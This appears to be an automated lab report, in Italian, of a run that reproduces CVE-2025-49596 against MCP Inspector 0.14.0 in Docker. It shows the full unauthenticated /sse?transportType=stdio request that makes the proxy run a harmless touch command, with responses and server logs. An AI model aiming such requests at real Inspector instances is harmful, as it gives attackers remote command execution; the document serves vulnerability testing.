# mcp_inspector, configurazione vulnerabile

Esecuzione del 2026-11-24 11:21:16 UTC. Completata.
Docker 29.9.3, Compose 5.7.0, commit git: 5f4e67a, nessuna modifica non salvata.

Autenticazione nel proxy di MCP Inspector (CVE-2025-49596): versione 0.14.0, senza controlli, contro 0.14.1, che richiede un token di sessione e controlla l'Origin. I primi tre casi chiedono /config, che non esegue nulla; gli ultimi due chiedono /sse con transportType=stdio, che fa avviare al proxy il comando touch su un file del volume condiviso, una volta con l'Origin di un sito esterno e una senza Origin. Il token corretto, quando serve, è letto dal log di avvio del proxy.

**Casi conformi all'atteso: 5/5**

## Esiti

| Caso | Tipo | Esito | Atteso | Conforme |
|---|---|---|---|---|
| controllo_token_corretto | controllo | accettata | accettata | sì |
| limite_token_errato | limite | accettata | accettata | sì |
| attacco_senza_autenticazione | attacco | accettata | accettata | sì |
| attacco_esecuzione_comando | attacco | eseguito | eseguito | sì |
| attacco_processo_locale | attacco | eseguito | eseguito | sì |

Conforme: l'esito osservato coincide con quello atteso per questa configurazione (con la versione vulnerabile, per i casi di attacco l'atteso è che riescano).

## Casi

### controllo_token_corretto (controllo)

Richiesta locale con il token di sessione corretto, letto dal log di avvio, e Origin ammessa (http://localhost:6274, quella del client web dell'Inspector). Deve funzionare in entrambe le versioni.

Output del client:

```
token di sessione nel log di avvio: assente
richiesta: GET /config, Authorization presente, Origin http://localhost:6274
HTTP 200 OK
header della risposta: {"access-control-allow-origin":"*","access-control-expose-headers":"mcp-session-id","connection":"keep-alive","content-length":"146","content-type":"application/json; charset=utf-8","date":"Tue, 24 Nov 2026 11:21:27 GMT","etag":"W/\"92-cFuxgQ7bquGm9PXvUnsobnH6Fp8\"","keep-alive":"timeout=5","x-powered-by":"Express"}
{"defaultEnvironment":{"HOME":"/root","PATH":"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"},"defaultCommand":"","defaultArgs":""}
200
```

Esito: **accettata**, atteso: accettata

### limite_token_errato (limite)

Token presente ma sbagliato, stessa Origin del controllo.

Output del client:

```
token di sessione nel log di avvio: assente
richiesta: GET /config, Authorization presente (sbagliato), Origin http://localhost:6274
HTTP 200 OK
header della risposta: {"access-control-allow-origin":"*","access-control-expose-headers":"mcp-session-id","connection":"keep-alive","content-length":"146","content-type":"application/json; charset=utf-8","date":"Tue, 24 Nov 2026 11:21:28 GMT","etag":"W/\"92-cFuxgQ7bquGm9PXvUnsobnH6Fp8\"","keep-alive":"timeout=5","x-powered-by":"Express"}
{"defaultEnvironment":{"HOME":"/root","PATH":"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"},"defaultCommand":"","defaultArgs":""}
200
```

Esito: **accettata**, atteso: accettata

### attacco_senza_autenticazione (attacco)

Nessun token e Origin del dominio dell'attaccante, come la richiesta di una pagina web esterna.

Output del client:

```
token di sessione nel log di avvio: assente
richiesta: GET /config, Authorization assente, Origin http://attaccante.example
HTTP 200 OK
header della risposta: {"access-control-allow-origin":"*","access-control-expose-headers":"mcp-session-id","connection":"keep-alive","content-length":"146","content-type":"application/json; charset=utf-8","date":"Tue, 24 Nov 2026 11:21:28 GMT","etag":"W/\"92-cFuxgQ7bquGm9PXvUnsobnH6Fp8\"","keep-alive":"timeout=5","x-powered-by":"Express"}
{"defaultEnvironment":{"HOME":"/root","PATH":"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"},"defaultCommand":"","defaultArgs":""}
200
```

Esito: **accettata**, atteso: accettata

### attacco_esecuzione_comando (attacco)

CVE-2025-49596: richiesta non autenticata a /sse con transportType=stdio e l'Origin del dominio dell'attaccante. Il comando touch crea un file nel volume condiviso, che la verifica cerca. Atteso: eseguito con 0.14.0, non eseguito con 0.14.1.

Output del client:

```
richiesta: GET /sse?transportType=stdio&command=touch&args=/condiviso/exploit-attacco_esecuzione_comando
header inviati: {"Origin":"http://attaccante.example"} (nessun token di sessione)
HTTP 200 OK
header della risposta: {"access-control-allow-origin":"*","access-control-expose-headers":"mcp-session-id","cache-control":"no-cache, no-transform","connection":"keep-alive","content-type":"text/event-stream","date":"Tue, 24 Nov 2026 11:21:28 GMT","transfer-encoding":"chunked","x-powered-by":"Express"}
200
```

Verifica sul container: `eseguito`

Esito: **eseguito**, atteso: eseguito

### attacco_processo_locale (attacco)

Stessa richiesta a /sse senza token e senza Origin, come quella di un processo locale. Atteso: eseguito con 0.14.0, non eseguito con 0.14.1 (401).

Output del client:

```
richiesta: GET /sse?transportType=stdio&command=touch&args=/condiviso/exploit-attacco_processo_locale
header inviati: {} (nessun token di sessione)
HTTP 200 OK
header della risposta: {"access-control-allow-origin":"*","access-control-expose-headers":"mcp-session-id","cache-control":"no-cache, no-transform","connection":"keep-alive","content-type":"text/event-stream","date":"Tue, 24 Nov 2026 11:21:30 GMT","transfer-encoding":"chunked","x-powered-by":"Express"}
200
```

Verifica sul container: `eseguito`

Esito: **eseguito**, atteso: eseguito

## Log del server

Estratto di `container.log`, con i traceback ridotti a una riga.

```
--- container usati per tutti i casi ---
target-1 11:21:20.712 ⚙️ Proxy server listening on port 6277
cattura-1 11:21:23.082 tcpdump: listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytes
target-1 11:21:28.904 New SSE connection. NOTE: The sse transport is deprecated and has been replaced by streamable-http
target-1 11:21:28.904 Query parameters: [Object: null prototype] {
target-1 11:21:28.904   transportType: 'stdio',
target-1 11:21:28.904   command: 'touch',
target-1 11:21:28.904   args: '/condiviso/exploit-attacco_esecuzione_comando'
target-1 11:21:28.904 }
target-1 11:21:28.905 Stdio transport: command=/usr/bin/touch, args=/condiviso/exploit-attacco_esecuzione_comando
target-1 11:21:28.907 Spawned stdio transport
target-1 11:21:28.907 Connected MCP client to backing server transport
target-1 11:21:28.907 Created client transport
target-1 11:21:28.907 Created server transport
target-1 11:21:28.908 Set up MCP proxy
target-1 11:21:30.010 New SSE connection. NOTE: The sse transport is deprecated and has been replaced by streamable-http
target-1 11:21:30.010 Query parameters: [Object: null prototype] {
target-1 11:21:30.010   transportType: 'stdio',
target-1 11:21:30.010   command: 'touch',
target-1 11:21:30.010   args: '/condiviso/exploit-attacco_processo_locale'
target-1 11:21:30.010 }
target-1 11:21:30.010 Stdio transport: command=/usr/bin/touch, args=/condiviso/exploit-attacco_processo_locale
target-1 11:21:30.011 Spawned stdio transport
target-1 11:21:30.011 Connected MCP client to backing server transport
target-1 11:21:30.011 Created client transport
target-1 11:21:30.011 Created server transport
target-1 11:21:30.011 Set up MCP proxy
cattura-1 11:21:31.182 94 packets captured
cattura-1 11:21:31.182 188 packets received by filter
cattura-1 11:21:31.182 0 packets dropped by kernel
```

## Altri file di questa cartella

- `container.log`: log dei container con timestamp, una sezione per avvio
- `pcap/`: traffico di rete del servizio sotto test (Wireshark), vuoto se il server usa stdio
- `risultati.jsonl`: output completo di ogni caso e ripetizione, per i programmi
- `meta.json`, `immagini.json`, `immagini_base.json`, `pacchetti.txt`, `comandi.log`, `scenario/`: versioni, digest, comandi e file usati
